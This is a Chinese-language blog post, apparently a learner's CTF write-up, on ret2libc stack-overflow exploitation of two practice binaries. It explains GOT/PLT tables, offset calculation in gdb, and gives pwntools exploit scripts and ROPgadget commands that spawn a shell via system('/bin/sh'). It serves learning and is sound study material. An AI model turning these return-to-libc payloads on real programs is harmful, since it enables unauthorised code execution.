@@ -1,0 +1,727 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Sinky">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="程序下载：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1rrz6u-w_TlmQcdQrU_rZlw 提取码：rc47 原理ret2libc 即控制函数执行libc中的函数，通常是返回至某个函数的plt处或者函数的具体位置(即函数对应的got表项的内容)。通常情况下，会选择执行system(&#39;&#x2F;bin&#x2F;sh&#39;)，所以需要先直到system函数的地址。 忘了plt啥是啥了，回忆一下： Got,P">
+<meta property="og:type" content="article">
+<meta property="og:title" content="基本ROP之ret2libc">
+<meta property="og:url" content="https://sinky.top/2022/12/09/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2libc/index.html">
+<meta property="og:site_name" content="Sinky&#39;s Blog">
+<meta property="og:description" content="程序下载：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1rrz6u-w_TlmQcdQrU_rZlw 提取码：rc47 原理ret2libc 即控制函数执行libc中的函数，通常是返回至某个函数的plt处或者函数的具体位置(即函数对应的got表项的内容)。通常情况下，会选择执行system(&#39;&#x2F;bin&#x2F;sh&#39;)，所以需要先直到system函数的地址。 忘了plt啥是啥了，回忆一下： Got,P">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.loli.net/2022/12/09/6H4z2hNIy5mSOrQ.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/09/6yR149KtDrTj8fx.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/09/E4a2SyeiWoKLJcB.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/12/mzOZa1Ipe7MLSXW.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/12/7x6h2lSs5EoIvpr.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/12/kjANIc2O3qZJM7e.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/12/p4sCBbRmZf6TcAQ.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/12/kJrzahF3b8gH4iU.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/12/l7aHPDZVyrvf148.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/12/IgaFqz2HrBwl1uh.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/12/7CTqJBtcA2Ov6aF.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/12/9ptqKDe4fdr6bWi.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/12/GHh9JYdNcVAWolx.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/12/n4vCXK6zgs2TGON.png">
+<meta property="og:image" content="https://s2.loli.net/2022/12/12/rU2kWYJIMHNz9Bw.png">
+<meta property="article:published_time" content="2022-12-09T05:23:07.171Z">
+<meta property="article:modified_time" content="2022-12-12T09:02:41.326Z">
+<meta property="article:author" content="Sinky">
+<meta property="article:tag" content="ROP">
+<meta property="article:tag" content="栈溢出">
+<meta property="article:tag" content="CTFWikiPWN">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s2.loli.net/2022/12/09/6H4z2hNIy5mSOrQ.png">
+  
+  
+  
+  <title>基本ROP之ret2libc - Sinky&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sinky.top","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="Sinky's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Sinky</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="基本ROP之ret2libc"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-12-09 13:23" pubdate>
+          December 9, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.4k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          21 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">基本ROP之ret2libc</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>程序下载：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1rrz6u-w_TlmQcdQrU_rZlw">https://pan.baidu.com/s/1rrz6u-w_TlmQcdQrU_rZlw </a><br>提取码：rc47</p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>ret2libc 即控制函数执行libc中的函数，通常是返回至某个函数的plt处或者函数的具体位置(即函数对应的got表项的内容)。通常情况下，会选择执行<code>system('/bin/sh')</code>，所以需要先直到system函数的地址。</p>
+<p>忘了plt啥是啥了，回忆一下：</p>
+<h2 id="Got-Plt表"><a href="#Got-Plt表" class="headerlink" title="Got,Plt表"></a>Got,Plt表</h2><ul>
+<li>got: 全局偏移表，用于存储外部函数在内存的确切地址，got表存储在数据段内，可以在程序运行中被修改。</li>
+<li>plt: 程序链接表，用于存储外部函数的入口点，即程序总会到plt寻找外部函数的地址，plt存储在代码段内，在运行之前就已经确定并且不会被修改，所以plt不会知道程序运行时动态链接库被加载的确切位置。</li>
+<li>plt表内存储的入口点就是got表中对应条目的地址</li>
+<li>got表初始值都指向plt表对应条目中的某个片段，该片段的作用是调用一个函数地址解析函数，如果是第一次调用这个函数，程序会通过got表再次跳转回plt表，运行地址解析程序来确定函数的确切地址，并用其覆盖掉got表初始值，之后再执行函数调用。当再次调用这个函数，程序仍然首先通过plt表跳转到got表，此时got表已经存有获取函数的内存地址，所以会直接跳转到函数所在地址执行函数</li>
+</ul>
+<h1 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h1><p>checksec查看：</p>
+<p><img src="https://s2.loli.net/2022/12/09/6H4z2hNIy5mSOrQ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>32位，got表可写，没开栈保护和地址随机，开启了NX(不可执行)</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>IDA分析：</p>
+<figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setvbuf</span>(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"RET2LIBC &gt;_&lt;"</span>);<br>  <span class="hljs-built_in">gets</span>(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>
+
+<p>gets()函数，存在栈溢出漏洞。</p>
+<p>查看字符串：</p>
+<pre><code class="hljs">`/bin/sh`：0x08048720
+system: 0x08048460
+</code></pre>
+<p>算偏移量，然后溢出到后门函数，就ok啦</p>
+<p>看一下call gets()的地址：</p>
+<p><img src="https://s2.loli.net/2022/12/09/6yR149KtDrTj8fx.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>gdb中下断点运行：</p>
+<pre><code class="hljs">b *0x0804867E
+</code></pre>
+<p><img src="https://s2.loli.net/2022/12/09/E4a2SyeiWoKLJcB.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>偏移量不对，看了一下wp</p>
+<pre><code class="hljs">char s[100]; // [esp+1Ch] [ebp-64h] BYREF
+</code></pre>
+<p>system在.plt段，调用plt中函数时需要在栈中部署两个参数，第一个是system执行后的返回地址，第二个是system函数中的参数。</p>
+<p><img src="https://s2.loli.net/2022/12/12/mzOZa1Ipe7MLSXW.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>栈构造如图，s变量距离esp指针0x1Ch,距离ebp指针0x64h,所以偏移量为<code>ebp-(esp+1C)+4=112</code></p>
+<p>还是不太理解，一般eax是存储返回地址的，所以偏移量就是<code>ebp-eax+4=112</code></p>
+<p><img src="https://s2.loli.net/2022/12/12/7x6h2lSs5EoIvpr.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>我看pwndbg可以直接得到偏移量，但是这边网络不能访问Github,等回家吧。</p>
+<p><img src="https://s2.loli.net/2022/12/12/kjANIc2O3qZJM7e.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code class="hljs">from&nbsp;pwn&nbsp;import&nbsp;*
+p&nbsp;=&nbsp;process("./ret2libc1")
+system_plt&nbsp;=&nbsp;0x08048460
+bin_sh&nbsp;=&nbsp;0x08048720
+payload&nbsp;=&nbsp;flat(['a'*112,system_plt,'b'*4,bin_sh])
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p><img src="https://s2.loli.net/2022/12/12/p4sCBbRmZf6TcAQ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h1 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h1><p><img src="https://s2.loli.net/2022/12/12/kJrzahF3b8gH4iU.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>32位，got表可写，开NX.</p>
+<p>IDA分析：</p>
+<p>main函数：</p>
+<pre><code class="hljs">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+    char s[100]; // [esp+1Ch] [ebp-64h] BYREF
+    setvbuf(stdout, 0, 2, 0);
+    puts("Something surprise here, but I don't think it will work.");
+    printf("What do you think ?");
+    gets(s);
+    return 0;
+}
+</code></pre>
+<p>有system</p>
+<p>无<code>/bin/sh</code></p>
+<p>需要自己来读取字符串，不会，看一看wp.</p>
+<blockquote>
+<p>思路：用geits输入system()的参数<code>/bin.sh</code></p>
+</blockquote>
+<p><img src="https://s2.loli.net/2022/12/12/l7aHPDZVyrvf148.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<pre><code class="hljs">gets_plt=0x08048460
+system_plt=0x08048490
+</code></pre>
+<p>去bss段瞅瞅能用的变量：</p>
+<p><img src="https://s2.loli.net/2022/12/12/IgaFqz2HrBwl1uh.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>看到了一个小可爱<code>buf2 (0x0804A080)</code></p>
+<p>用gadget找ret语句：</p>
+<pre><code class="hljs">ROPgadget --binary ret2libc2 --only 'pop|ret'
+</code></pre>
+<p><img src="https://s2.loli.net/2022/12/12/7CTqJBtcA2Ov6aF.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>选择:</p>
+<pre><code class="hljs">0x0804843d : pop ebx ; ret
+</code></pre>
+<p>因为其他的只有<code>pop ebx</code>，没有<code>pop eax</code></p>
+<p>算一下偏移吧，做到这里我甚至不知道自己干啥呢……没咋明白。</p>
+<p>在gets()处断点：</p>
+<pre><code class="hljs">b *0x080486BA
+</code></pre>
+<p>运行：</p>
+<p><img src="https://s2.loli.net/2022/12/12/9ptqKDe4fdr6bWi.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<pre><code class="hljs">EAX: 0xffffd49c
+EBP: 0xffffd508
+ESP: 0xffffd480
+</code></pre>
+<p>跟ret2libc1一样，偏移就是112（用pwndbg爆出来也行<code>cyclic -l </code>）</p>
+<p>栈结构一般是：</p>
+<p><img src="https://s2.loli.net/2022/12/12/GHh9JYdNcVAWolx.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>本题栈结构：</p>
+<p><img src="https://s2.loli.net/2022/12/12/n4vCXK6zgs2TGON.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<pre><code class="hljs">payload=flat(['a'*112,gets_plt,system_plt,buf2,buf2,'/bin/sh'])
+</code></pre>
+<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><pre><code class="hljs">from pwn import *
+p=process('./ret2libc2')
+system_plt=0x08048490
+gets_plt=0x08048460
+buf2=0x0804A080
+payload=flat(['a'*112,gets_plt,system_plt,buf2,buf2,'/bin/sh'])
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p><img src="https://s2.loli.net/2022/12/12/rU2kWYJIMHNz9Bw.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>成功！！！！</p>
+<p>虽然不大明白，但是大概明白……</p>
+<h1 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h1>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ROP/">#ROP</a>
+      
+        <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">#栈溢出</a>
+      
+        <a href="/tags/CTFWikiPWN/">#CTFWikiPWN</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>基本ROP之ret2libc</div>
+      <div>https://sinky.top/2022/12/09/基本ROP之ret2libc/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Sinky</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>December 9, 2022</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>Licensed under</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/01/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCTF-Misc2/" title="攻防世界CTF-Misc2">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">攻防世界CTF-Misc2</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/12/08/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2syscall/" title="基本ROP之ret2syscall">
+                        <span class="hidden-mobile">基本ROP之ret2syscall</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
